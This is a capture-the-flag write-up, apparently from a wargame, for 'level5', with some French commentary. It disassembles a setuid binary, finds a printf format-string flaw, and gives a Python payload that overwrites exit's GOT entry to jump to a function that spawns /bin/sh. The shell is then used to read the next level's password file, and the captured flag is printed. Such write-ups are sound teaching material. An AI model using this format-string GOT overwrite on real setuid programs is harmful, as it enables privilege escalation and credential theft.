# level5

```bash
$ ls -l
total 8
-rwsr-s---+ 1 level6 users 5385 Mar  6  2016 level5
$ file level5
level5: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xed1835fb7b09db7da4238a6fa717ad9fd835ae92, not stripped
$ gdb -q ./level5
Reading symbols from /home/user/level5/level5...(no debugging symbols found)...done.
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08048334  _init
0x08048380  printf
0x08048380  printf@plt
0x08048390  _exit
0x08048390  _exit@plt
0x080483a0  fgets
0x080483a0  fgets@plt
0x080483b0  system
0x080483b0  system@plt
0x080483c0  __gmon_start__
0x080483c0  __gmon_start__@plt
0x080483d0  exit
0x080483d0  exit@plt
0x080483e0  __libc_start_main
0x080483e0  __libc_start_main@plt
0x080483f0  _start
0x08048420  __do_global_dtors_aux
0x08048480  frame_dummy
0x080484a4  o
0x080484c2  n
0x08048504  main
0x08048520  __libc_csu_init
0x08048590  __libc_csu_fini
0x08048592  __i686.get_pc_thunk.bx
0x080485a0  __do_global_ctors_aux
0x080485cc  _fini
(gdb) disas main
Dump of assembler code for function main:
   0x08048504 <+0>:     push   %ebp
   0x08048505 <+1>:     mov    %esp,%ebp
   0x08048507 <+3>:     and    $0xfffffff0,%esp
   0x0804850a <+6>:     call   0x80484c2 <n>
   0x0804850f <+11>:    leave
   0x08048510 <+12>:    ret
End of assembler dump.
(gdb) disas n
Dump of assembler code for function n:
   0x080484c2 <+0>:     push   %ebp
   0x080484c3 <+1>:     mov    %esp,%ebp
   0x080484c5 <+3>:     sub    $0x218,%esp
   0x080484cb <+9>:     mov    0x8049848,%eax
   0x080484d0 <+14>:    mov    %eax,0x8(%esp)
   0x080484d4 <+18>:    movl   $0x200,0x4(%esp)
   0x080484dc <+26>:    lea    -0x208(%ebp),%eax
   0x080484e2 <+32>:    mov    %eax,(%esp)
   0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:    lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:    mov    %eax,(%esp)
   0x080484f3 <+49>:    call   0x8048380 <printf@plt>
   0x080484f8 <+54>:    movl   $0x1,(%esp)
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
End of assembler dump.
(gdb) disas o
Dump of assembler code for function o:
   0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp
   0x080484a7 <+3>:     sub    $0x18,%esp
   0x080484aa <+6>:     movl   $0x80485f0,(%esp)
   0x080484b1 <+13>:    call   0x80483b0 <system@plt>
   0x080484b6 <+18>:    movl   $0x1,(%esp)
   0x080484bd <+25>:    call   0x8048390 <_exit@plt>
End of assembler dump.
```

```bash
# Decompile main
void main(void)
{
  n();
  return;
}

# Decompile n
void n(void)
{
  char local_20c [520];

  fgets(local_20c,0x200,stdin);
  printf(local_20c);
  exit(1);
}

# Decompile o
void o(void)
{
  system("/bin/sh");
  _exit(1);
}
```

Le problème est que la fonction `n` n’utilise pas de return mais un `exit` il faut donc trouver l’adresse de `exit` et la remplacer par celle de `o` dans la `Global Offset Table`

```bash
$ objdump -R level5

level5:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049814 R_386_GLOB_DAT    __gmon_start__
08049848 R_386_COPY        stdin
08049824 R_386_JUMP_SLOT   printf
08049828 R_386_JUMP_SLOT   _exit
0804982c R_386_JUMP_SLOT   fgets
08049830 R_386_JUMP_SLOT   system
08049834 R_386_JUMP_SLOT   __gmon_start__
08049838 R_386_JUMP_SLOT   exit # voici l'adresse d'exit dans la GOT
0804983c R_386_JUMP_SLOT   __libc_start_main

$ python -c 'print "BBBB" + " | %x" * 8' > /tmp/payload.txt
$ ./level5 < /tmp/payload.txt
BBBB | 200 | b7fd1ac0 | b7ff37d0 | 42424242 | 25207c20 | 207c2078 | 7c207825 | 20782520
# 4th position on the stack

$ nano /tmp/exploit.py
exit_addr = "\x38\x98\x04\x08"  # Adresse de `exit` dans la GOT
o_addr = "\xa4\x84\x04\x08" # Adresse de `o`

padding = 134513828 - len(exit_addr) # Adresse de `o` en int (int(0x080484a4) == 134513828)
exploit_string = exit_addr + "%" + str(padding) + "x" + "%4$n"
print(exploit_string)

$ python /tmp/exploit.py > /tmp/payload.txt
$ (cat /tmp/payload.txt; cat) | ./level5
# wait can be long due to padding
																							 200
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

FLAG: `d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31`
